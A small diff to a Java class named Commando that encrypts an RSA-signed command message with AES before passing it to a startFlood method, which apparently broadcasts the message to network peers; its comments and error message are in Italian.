@@ -172,6 +172,7 @@ public class Commando {
 		if (user != null) {
 
 			String msg = "";
+			String request="";
 			// aggiungi nonce time.millis
 			Long milli = System.currentTimeMillis();
 
@@ -184,12 +185,13 @@ public class Commando {
 			try {
 				signature = pki.signMessageRSA(hashIdMsg);
 				msg = hashIdMsg + "|" + cmd + "|" + signature;
+				request=pki.getCrypto().encryptAES(msg);
 			} catch (InvalidKeyException | SignatureException e) {
 				e.printStackTrace();
 				System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
 			}
 
-			startFlood(msg);
+			startFlood(request);
 		}
 		return;
 	}
